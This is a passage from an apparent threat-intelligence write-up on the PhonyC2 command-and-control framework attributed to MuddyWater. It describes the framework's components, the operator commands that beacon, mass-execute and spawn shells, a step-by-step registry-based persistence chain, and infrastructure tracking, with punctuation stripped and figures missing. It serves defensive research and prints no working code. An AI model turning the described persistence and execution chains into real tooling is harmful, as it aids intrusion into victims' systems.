as seen in line 5 in figure 4 Additionally the script will add to the configpy file random UUIDs Universal Unique Identifiers which makes tracking the URLs of the C2 framework less trivialAn example of configpy fileIn figure 6 the config file contains various PowerShell commands which are different payloads that are used by the frameworkThe mainpy file is small and starts a multi-threaded webserver and a command line listener From this code we see that the name PhonyC2 is used internallyThe webserverpy is responsible for serving the C2 framework payloadsFigure 8 shows the remnants from previous iterations of the framework in the commented-out route names which have been replaced in this iteration of the framework with the random UUID in the configpy file lines 13-20 in Figure 5Commandlinepy receives commands from the operator and prints the output of various actions taken by the C2While the malicious files from Microsofts report are not publicly available for inspection the combination of the IP addresses related to PhonyC2 appearing in Microsofts report with those file names makes a strong argument that the Phony C2 framework was used in the attack on the Technion Additionally the files created by the C2 framework are detected as PowerShellDownloaderSB the same detection name Microsoft used in their blogSince both files are dynamically generated by the C2 framework they are slightly different in each execution of the framework therefore blocking the hashes Microsoft provided is not exhaustiveWhile it might look like there are many options and outputs the C2 is actually simple if we understand what the code doespayload CommandIn figure 11 we see a step-by-step explanation of what happensPowerShell command writes the base64 decoded content to cprogramdatadbps1PowerShell command executes dbps1 which in turn reads and decodes dbsqlite and executes the result in memoryEssentially this is a one-liner to execute on a compromised host so it will beacon back to the C2As previously mentioned the files generated by the C2 are slightly different each time however the decoding logic remains mostly the sameBelow is an example of dbsqlite content and a diagram explaining the decoding routinedropper CommandThis command creates different variants of PowerShell commands only for step 1Ex3cut3 CommandThis command creates different variants of PowerShell commands for both step 2 and 3 combinedlist CommandThe list command shows all the connected computers to the C2 with some associated informationsetcommandforall CommandThis command is the most important one as it allows the threat actor to execute the same command on all the connected computers at the same time For example a command that will download and execute a ransomware payloaduse CommandThis command allows the threat actor to get a PowerShell shell on a specific computerIf the use command is selected additional commands become availablepersist and Other CommandsMost of these additional commands are self-explanatory the only interesting one is persistThe persist command is used to generate a PowerShell code to enable the operator to gain persistence on the infected host so it will connect back to the C2 if the infected host is restartedAdditionally when the operator executes the persist command it writes an encrypted payload to a pre-defined random registry path in HKLMSoftware This can be partially seen in commandlinepy figure 22 as some of the values are stored in configpyThe encrypted payload is a slightly modified version of persistpayload2022ps1 that triggered the entire investigationBelow is the full chain used to achieve persistence by PhonyC2By executing persist on a machine connected to PhonyC2 the C2 writes encrypted payload to the registryAdd a registry key to the Windows registry that runs a script file named utilsjse located in the Cintelutils directory at startupCreate the directory cintelutils if it does not existChange the current directory to cintelutilsDecode a base64 blob and write it into utilsjseWhen the computer is rebooted the run key causes the execution of the utilsjse scriptThe utilsjse script reads and executes the contents from the registry as seen in figure 23The PowerShell code in figure 25 connects to the CC server to receive and execute a code that is similar to the belowThe obfuscated payload was saved to a file named datasqlite which is remarkably similar to the file name used in PhonyC2 In addition the obfuscated payload has the same comma separated delimiter that is in the current PhonyC2 payloads and the decoding routine is different from the most recent oneDuring our research we uncovered PhonyC2 servers with different ETag values or no ETag at all We suspect that the occurrence of servers with same ETag value originate from duplication of the server image by the VPS provider Therefore this method might work occasionally but will be of value mostly for historical purposesPassive DNS resolution of this IP is showing the domain 6nc110821hdbco This domain was also resolving to two other PowGoop servers3 letters1 digitdot6ncdateoptional 2

suspect that those domains represent infrastructure registered in 2021 by MuddyWater that are still active todayThere are additional domains where we did not find active infrastructure such as 6nc051221bco and 6nc110821hdaco In the past the latter was resolving to known MuddyWater infrastructure 6nc could be interpreted as CC Six and C which is an abbreviation to Command and ControlThis IP address was also hosting various payloads While we could not retrieve most of them we were able to capture the directory listing of the server in CensysIn this instance of PhonyC2 MuddyWater decided to use Port 53 for the server which is normally reserved for DNS use This shows yet another attempt by MuddyWater to change their TTPs and conceal their malicious activityThis is also the third overlap of PhonyC2 intersecting with Microsofts reporting on MuddyWater activityMuddyWater is continuously updating the C2 and changing TTPs to avoid detection as can be seen throughout the blog and in the investigation of the leaked code of PhonyC2The part of the URL that is marked in red has been changed since PhonyC2 V6 the use of UUIDs has been changed and the go extension was added The second part of the URL in green has not been changed from the V6 codeWhile the encoded payload green looks similar to what we have seen in V6 MuddyWatter added a benign HTML code red to further
